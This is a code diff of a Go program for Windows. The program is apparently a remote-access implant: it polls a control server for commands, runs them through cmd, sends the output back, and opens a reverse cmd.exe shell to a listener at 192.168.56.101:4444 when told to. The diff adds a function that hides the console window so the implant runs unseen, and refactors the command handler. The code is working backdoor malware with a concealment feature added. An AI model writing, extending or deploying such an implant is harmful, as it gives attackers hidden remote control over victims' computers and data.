@@ -9,27 +9,42 @@ import (
     "net/http"
     "os/exec"
     "sync"
+    "syscall"
     "time"
 )
 
-// Command received from the server
+var (
+    mu               sync.Mutex
+    isCommandRunning bool
+    serverURL        = "http://192.168.56.101:5000"
+    listenerAddress  = "192.168.56.101:4444"
+)
+
+var kernel32 = syscall.NewLazyDLL("kernel32.dll")
+var user32 = syscall.NewLazyDLL("user32.dll")
+
+var (
+    procGetConsoleWindow = kernel32.NewProc("GetConsoleWindow")
+    procShowWindow       = user32.NewProc("ShowWindow")
+)
+
+func hideConsoleWindow() {
+    consoleWindow, _, _ := procGetConsoleWindow.Call()
+    if consoleWindow == 0 {
+        return // No console window attached
+    }
+    procShowWindow.Call(consoleWindow, 0) // SW_HIDE = 0
+}
+
 type Command struct {
     ID  string `json:"id"`
     Cmd string `json:"cmd"`
 }
 
-// CommandResult to be sent back to the server
 type CommandResult struct {
     ID     string `json:"id"`
     Result string `json:"result"`
 }
-
-var (
-    mu               sync.Mutex
-    isCommandRunning bool
-    serverURL        = "http://192.168.56.101:5000" // Your server URL
-    listenerAddress  = "192.168.56.101:4444"        // Listener address for the reverse shell
-)
 
 func fetchCommand() (Command, error) {
     var cmd Command
@@ -59,14 +74,38 @@ func sendResult(result CommandResult) {
     }
 }
 
+func executeCommandAndSendResult(cmd Command) {
+    if cmd.Cmd == "shell" {
+        // Specific handling for the "shell" command to open a reverse shell
+        openReverseShell()
+    } else {
+        // Execute other commands
+        output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
+        resultText := string(output)
+        if err != nil {
+            resultText += "\nError: " + err.Error()
+        }
+
+        result := CommandResult{
+            ID:     cmd.ID,
+            Result: resultText,
+        }
+
+        sendResult(result)
+    }
+}
+
 func openReverseShell() {
+    // Implementation of the reverse shell functionality
+    // Depending on your exact requirements, this could connect back to a netcat listener or similar
+    // This is placeholder logic; ensure you replace it with your specific reverse shell implementation
     conn, err := net.Dial("tcp", listenerAddress)
     if err != nil {
         fmt.Printf("Failed to open reverse shell to %s: %v\n", listenerAddress, err)
         return
     }
     defer conn.Close()
-
+    
     cmd := exec.Command("cmd.exe")
     cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
     if err := cmd.Run(); err != nil {
@@ -74,27 +113,8 @@ func openReverseShell() {
     }
 }
 
-func executeCommand(cmd Command) {
-    if cmd.Cmd == "shell" {
-        // Open a reverse shell connection
-        openReverseShell()
-    } else {
-        // Execute other commands and capture output
-        output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
-        resultText := string(output)
-        if err != nil {
-            resultText += fmt.Sprintf("\nError: %v", err)
-        }
-
-        // Send command execution result back to the server
-        sendResult(CommandResult{
-            ID:     cmd.ID,
-            Result: resultText,
-        })
-    }
-}
-
 func main() {
+    hideConsoleWindow()
     fmt.Println("Application started. Waiting for commands...")
     ticker := time.NewTicker(10 * time.Second)
 
@@ -111,7 +131,7 @@ func main() {
                     continue
                 }
                 if cmd.ID != "" {
-                    executeCommand(cmd)
+                    executeCommandAndSendResult(cmd)
                 }
 
                 mu.Lock()
